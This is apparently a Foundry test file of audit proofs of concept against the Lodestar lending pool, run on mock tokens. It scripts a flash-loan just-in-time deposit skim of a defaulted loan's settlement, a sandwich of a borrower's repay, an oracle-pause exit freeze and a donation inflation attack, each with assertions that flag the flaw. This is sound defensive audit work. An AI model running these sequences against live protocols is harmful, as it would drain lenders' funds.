// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ILstRateProvider} from "../../src/interfaces/ILstRateProvider.sol";
import {LodestarOracle} from "../../src/LodestarOracle.sol";
import {LodestarPool} from "../../src/LodestarPool.sol";
import {LodestarLoanBook} from "../../src/LodestarLoanBook.sol";
import {MockERC20, MockFtsoV2, MockRouter, MockRate} from "../Lodestar.t.sol";

/// @dev An LST rate provider that can be switched off, like a paused/upgrading Sceptre proxy.
contract BreakableRate is ILstRateProvider {
    uint256 public rate = 1e18;
    bool public broken;

    function set(uint256 r) external {
        rate = r;
    }

    function breakIt(bool b) external {
        broken = b;
    }

    function underlyingPerShare() external view returns (uint256) {
        require(!broken, "rate provider paused");
        return rate;
    }
}

/// @notice Adversarial PoCs against LodestarPool's impairment accounting.
contract AuditJitSettlementSkimTest is Test {
    MockERC20 usdt0;
    MockERC20 fxrp;
    MockERC20 sflr;
    MockFtsoV2 ftso;
    MockRouter router;
    BreakableRate sflrRate;
    LodestarOracle oracle;
    LodestarPool pool;
    LodestarLoanBook book;
    bytes21 constant XRP = bytes21("XRP/USD");
    bytes21 constant FLR = bytes21("FLR/USD");

    address owner = address(this);
    address reserve = address(0xEE5E);
    address lender = address(0x1E7D);
    address borrower = address(0xB0B);
    address keeper = address(0xC0FFEE);
    address attacker = makeAddr("attacker");
    address philanthropist = makeAddr("firstLossContributor");

    uint256 id;

    function setUp() public {
        usdt0 = new MockERC20("USDT0", "USDT0", 6);
        fxrp = new MockERC20("FXRP", "FXRP", 6);
        sflr = new MockERC20("Staked FLR", "sFLR", 18);
        ftso = new MockFtsoV2();
        ftso.set(XRP, 250_000_000, 8); // $2.50
        ftso.set(FLR, 2_000_000, 8); // $0.02
        sflrRate = new BreakableRate();
        oracle = new LodestarOracle(address(ftso), owner);
        oracle.setFeed(address(fxrp), XRP, address(0), 1 hours, 0);
        oracle.setFeed(address(sflr), FLR, address(sflrRate), 1 hours, 0);
        pool = new LodestarPool(IERC20(address(usdt0)), owner);
        book = new LodestarLoanBook(pool, oracle, reserve, owner);
        pool.setLoanBook(address(book));
        router = new MockRouter();
        book.setRouterAllowed(address(router), true);
        book.addTier(address(fxrp), 5000, 7 days, 200); // 50% LTV, 7d, 2% fee
        book.addTier(address(sflr), 5000, 90 days, 200); // long-dated LST tier

        // honest lender: 200,000.000000 USDT0
        usdt0.mint(lender, 200_000e6);
        vm.startPrank(lender);
        usdt0.approve(address(pool), type(uint256).max);
        pool.deposit(200_000e6, lender);
        vm.stopPrank();

        // borrower: 40,000.000000 FXRP @ $2.50 = $100,000 -> 50% LTV -> principal 50,000.000000
        fxrp.mint(borrower, 40_000e6);
        vm.startPrank(borrower);
        fxrp.approve(address(book), type(uint256).max);
        id = book.open(address(fxrp), 40_000e6, 0);
        vm.stopPrank();
        (,,, uint128 principal,,,,,,,) = book.loans(id);
        assertEq(principal, 50_000e6, "principal");
    }

    /// An outside party subordinates 15,000.000000 USDT0 of FIRST-LOSS capital ahead of lenders.
    function _fundFirstLoss() internal {
        usdt0.mint(philanthropist, 15_000e6);
        vm.startPrank(philanthropist);
        usdt0.approve(address(book), type(uint256).max);
        book.fundReserve(15_000e6);
        vm.stopPrank();
    }

    /// Drive the loan to a marked-down, fully-decayed default: XRP crashes 60% to $1.00.
    function _crashAndDefault() internal {
        ftso.set(XRP, 100_000_000, 8); // $1.00 -> collateral worth 40,000.000000
        vm.warp(block.timestamp + 7 days + 48 hours + 1); // past due + grace = defaulted
        book.impair(id); // permissionless mark
        // est = 40,000 * (1 - 5% keeperBps) = 38,000 ; loss = 50,000 - 38,000 = 12,000.000000
        assertEq(pool.impairedLoss(), 12_000e6, "marked loss");
        vm.warp(block.timestamp + 24 hours); // Dutch floor fully decayed to settleFloorMinBps = 8500
    }

    function _buyoutBy(address who) internal returns (uint256 cost) {
        cost = book.buyoutCost(id);
        usdt0.mint(who, cost);
        vm.startPrank(who);
        usdt0.approve(address(book), type(uint256).max);
        book.buyout(id, cost);
        vm.stopPrank();
    }

    // ===================================================================================
    // H-1: atomic deposit -> buyout -> redeem steals the impairment reversal AND the
    // externally contributed first-loss buffer from the standing lender.
    // nonReentrant does NOT stop this: these are SEQUENTIAL top-level calls.
    // ===================================================================================
    function test_H1_JitDepositCapturesSettlementJumpAndFirstLossBuffer() public {
        _fundFirstLoss();
        _crashAndDefault();

        uint256 lenderShares = pool.balanceOf(lender);

        // ---------- WORLD A: an ordinary keeper settles. No JIT depositor. ----------
        uint256 snap = vm.snapshotState();
        uint256 costA = _buyoutBy(keeper);
        uint256 lenderValueA = pool.previewRedeem(lenderShares);
        vm.revertToState(snap);

        // ---------- WORLD B: attacker flash-loans, JIT-deposits, buys out, redeems ----------
        uint256 flash = 2_000_000e6; // 2,000,000.000000 USDT0 flash loan
        usdt0.mint(attacker, flash);
        vm.startPrank(attacker);
        usdt0.approve(address(pool), type(uint256).max);
        usdt0.approve(address(book), type(uint256).max);
        uint256 atkShares = pool.deposit(flash, attacker); // sweep runs; price already marked down
        vm.stopPrank();

        uint256 costB = book.buyoutCost(id);
        usdt0.mint(attacker, costB);
        vm.startPrank(attacker);
        book.buyout(id, costB); // collateral -> attacker, reversal + reserve cover -> pool
        uint256 atkOut = pool.redeem(atkShares, attacker, attacker); // all one tx in practice
        vm.stopPrank();

        assertEq(fxrp.balanceOf(attacker), 40_000e6, "attacker took the collateral");
        uint256 lenderValueB = pool.previewRedeem(lenderShares);

        console2.log("buyout cost world A / world B   ", costA, costB);
        console2.log("WORLD A lender share value      ", lenderValueA);
        console2.log("WORLD B lender share value      ", lenderValueB);
        console2.log("LENDER LOSS TO THE JIT DEPOSITOR", lenderValueA - lenderValueB);
        console2.log("attacker deposit in             ", flash);
        console2.log("attacker redeem out             ", atkOut);
        console2.log("SKIM ON THE DEPOSIT ROUND-TRIP  ", atkOut - flash);

        // The attacker's redemption alone must not exceed what they deposited, otherwise the
        // JIT deposit round-trip is a pure skim of the settlement jump.
        assertLe(atkOut, flash, "JIT DEPOSIT ROUND-TRIP PROFITED FROM THE SETTLEMENT JUMP");
        // And the standing lender must be no worse off for the attacker having shown up.
        assertGe(lenderValueB, lenderValueA, "JIT DEPOSITOR DILUTED THE STANDING LENDER'S RECOVERY");
    }

    // ===================================================================================
    // H-1b: same skim with zero capital at risk in the settlement itself - a plain mempool
    // sandwich of the BORROWER's own repay() of an impaired-but-recovered loan.
    // ===================================================================================
    function test_H1b_JitDepositSandwichesBorrowerRepay() public {
        ftso.set(XRP, 100_000_000, 8); // $1.00 crash mid-term, loan not yet due
        book.impair(id);
        assertEq(pool.impairedLoss(), 12_000e6, "marked loss");

        uint256 lenderShares = pool.balanceOf(lender);

        uint256 snap = vm.snapshotState();
        // WORLD A: borrower simply repays.
        usdt0.mint(borrower, 50_000e6);
        vm.startPrank(borrower);
        usdt0.approve(address(pool), type(uint256).max);
        book.repay(id);
        vm.stopPrank();
        uint256 lenderValueA = pool.previewRedeem(lenderShares);
        vm.revertToState(snap);

        // WORLD B: attacker front-runs the repay with a flash-loaned deposit, back-runs a redeem.
        uint256 flash = 2_000_000e6;
        usdt0.mint(attacker, flash);
        vm.startPrank(attacker);
        usdt0.approve(address(pool), type(uint256).max);
        uint256 atkShares = pool.deposit(flash, attacker);
        vm.stopPrank();

        usdt0.mint(borrower, 50_000e6);
        vm.startPrank(borrower);
        usdt0.approve(address(pool), type(uint256).max);
        book.repay(id); // the victim transaction
        vm.stopPrank();

        vm.prank(attacker);
        uint256 atkOut = pool.redeem(atkShares, attacker, attacker);
        uint256 lenderValueB = pool.previewRedeem(lenderShares);

        console2.log("REPAY SANDWICH attacker in  ", flash);
        console2.log("REPAY SANDWICH attacker out ", atkOut);
        console2.log("REPAY SANDWICH profit       ", atkOut - flash);
        console2.log("REPAY SANDWICH lender world A", lenderValueA);
        console2.log("REPAY SANDWICH lender world B", lenderValueB);

        assertLe(atkOut, flash, "REPAY SANDWICH PROFITED");
        assertGe(lenderValueB, lenderValueA, "REPAY SANDWICH DILUTED THE STANDING LENDER");
    }

    // ===================================================================================
    // M-1: the impairment mark uses keeperBps (5%) as the recovery haircut, but the Dutch
    // settlement floor bottoms at settleFloorMinBps (85%). The mark therefore assumes a
    // recovery 10pp of collateral value HIGHER than the worst case settlement actually pays,
    // so a lender exiting after the mark but before settlement dodges part of the real loss.
    // No reserve buffer here, so the shortfall lands purely on lenders.
    // ===================================================================================
    function test_M1_MarkUnderstatesLossVersusDutchFloor() public {
        _crashAndDefault(); // NOTE: no _fundFirstLoss()
        assertEq(book.reserveBalance(), 200e6, "only the 20% fee cut is in the buffer");

        uint256 lenderShares = pool.balanceOf(lender);
        uint256 markedValue = pool.previewRedeem(lenderShares); // what an exiting lender gets NOW

        uint256 cost = _buyoutBy(keeper); // realised settlement at the fully-decayed Dutch floor
        uint256 settledValue = pool.previewRedeem(lenderShares);

        console2.log("marked recovery assumed (est)   ", uint256(40_000e6) * 9_500 / 10_000);
        console2.log("actual buyout proceeds          ", cost);
        console2.log("lender value at the MARK        ", markedValue);
        console2.log("lender value AFTER settlement   ", settledValue);
        console2.log("EXIT-BEFORE-SETTLEMENT ADVANTAGE", markedValue - settledValue);

        assertLe(markedValue, settledValue + 1, "MARK IS OPTIMISTIC: exit before settlement dodges loss");
    }

    // ===================================================================================
    // M-2: a THIRD-PARTY LST rate provider (Sceptre's single-EOA-upgradeable proxy) pausing
    // makes oracleReady() false, which reverts EVERY lender's withdraw/redeem pool-wide for
    // as long as any sFLR loan is open - up to the 90 day term. One $100 loan is enough.
    // ===================================================================================
    function test_M2_ThirdPartyRateProviderFreezesAllLenderExits() public {
        // a tiny sFLR loan: 500 sFLR @ $0.02 = $10 ... use enough to clear minPrincipal ($10)
        uint256 collAmt = 2_000e18; // $40 of sFLR -> $20 principal at 50% LTV
        sflr.mint(borrower, collAmt);
        vm.startPrank(borrower);
        sflr.approve(address(book), type(uint256).max);
        book.open(address(sflr), collAmt, 0); // tiers are per-collateral: sFLR's only tier is index 0
        vm.stopPrank();

        // baseline: the lender can exit normally
        assertGt(pool.maxRedeem(lender), 0, "lender should be able to exit before the outage");

        sflrRate.breakIt(true); // Sceptre pauses / upgrades

        assertEq(pool.maxRedeem(lender), 0, "maxRedeem should report the freeze");
        assertEq(pool.maxWithdraw(lender), 0, "maxWithdraw should report the freeze");

        uint256 lenderShares = pool.balanceOf(lender); // hoisted: expectRevert binds the NEXT call
        vm.prank(lender);
        vm.expectRevert(LodestarLoanBook.OracleDown.selector);
        pool.redeem(lenderShares, lender, lender);

        // ... but deposits are still wide open at the (now unmarkable) share price
        usdt0.mint(attacker, 1_000e6);
        vm.startPrank(attacker);
        usdt0.approve(address(pool), type(uint256).max);
        uint256 s = pool.deposit(1_000e6, attacker);
        vm.stopPrank();
        console2.log("deposit accepted during a total exit freeze, shares:", s);
        assertGt(s, 0, "deposits stayed open while every exit was frozen");
    }

    // ===================================================================================
    // CLEAN CHECK: rounding on every 4626 path must favour the pool, never the individual.
    // ===================================================================================
    function testFuzz_Clean_DepositRedeemRoundTripNeverProfits(uint96 amt) public {
        uint256 a = bound(uint256(amt), 1, 5_000_000e6);
        usdt0.mint(attacker, a);
        vm.startPrank(attacker);
        usdt0.approve(address(pool), type(uint256).max);
        uint256 sh = pool.deposit(a, attacker);
        uint256 back = pool.redeem(sh, attacker, attacker);
        vm.stopPrank();
        assertLe(back, a, "deposit->redeem round trip profited");
    }

    function testFuzz_Clean_MintWithdrawRoundTripNeverProfits(uint96 shares) public {
        uint256 s = bound(uint256(shares), 1e6, 1_000_000e12);
        usdt0.mint(attacker, 10_000_000e6);
        vm.startPrank(attacker);
        usdt0.approve(address(pool), type(uint256).max);
        uint256 paid = pool.mint(s, attacker);
        uint256 got = pool.previewRedeem(pool.balanceOf(attacker));
        vm.stopPrank();
        assertLe(got, paid, "mint priced the shares below their redeemable value");
    }

    // ===================================================================================
    // CLEAN CHECK: ERC4626 inflation / donation. The pool is seeded at deploy and carries a
    // 6-decimal offset; a first-depositor donation attack must lose money.
    // ===================================================================================
    function test_Clean_DonationInflationAttackLosesMoney() public {
        // fresh, but SEEDED exactly as DeployMainnet does (SEED_MIN = 10e6)
        LodestarPool p = new LodestarPool(IERC20(address(usdt0)), owner);
        usdt0.mint(address(this), 10e6);
        usdt0.approve(address(p), type(uint256).max);
        p.deposit(10e6, address(this)); // mandatory seed

        // attacker donates 100,000.000000 USDT0 straight to the pool to inflate the share price
        uint256 donation = 100_000e6;
        usdt0.mint(attacker, donation + 1);
        vm.startPrank(attacker);
        usdt0.approve(address(p), type(uint256).max);
        uint256 atkShares = p.deposit(1, attacker); // 1 unit = 0.000001 USDT0
        usdt0.transfer(address(p), donation);
        vm.stopPrank();

        // victim deposits 50,000.000000
        usdt0.mint(lender, 50_000e6);
        vm.startPrank(lender);
        usdt0.approve(address(p), type(uint256).max);
        uint256 vShares = p.deposit(50_000e6, lender);
        vm.stopPrank();

        uint256 atkOut = p.previewRedeem(atkShares);
        uint256 vOut = p.previewRedeem(vShares);
        console2.log("attacker spent (donation + 1)", donation + 1);
        console2.log("attacker redeemable          ", atkOut);
        console2.log("victim deposited             ", uint256(50_000e6));
        console2.log("victim redeemable            ", vOut);
        assertGt(vShares, 0, "victim was rounded to zero shares");
        assertLt(atkOut, donation + 1, "donation attack was profitable");
    }

    // ===================================================================================
    // CLEAN CHECK: totalAssets can never underflow - impairedLoss <= principalOut always.
    // ===================================================================================
    function test_Clean_ImpairedLossNeverExceedsPrincipalOut() public {
        ftso.set(XRP, 1_000_000, 8); // $0.01: collateral worth 400, principal 50,000 -> total wipeout
        book.impair(id);
        console2.log("principalOut", pool.principalOut());
        console2.log("impairedLoss", pool.impairedLoss());
        assertLe(pool.impairedLoss(), pool.principalOut(), "impairedLoss exceeded principalOut");
        pool.totalAssets(); // must not revert
        assertGt(pool.totalAssets(), 0, "totalAssets underflowed / hit zero");
    }
}
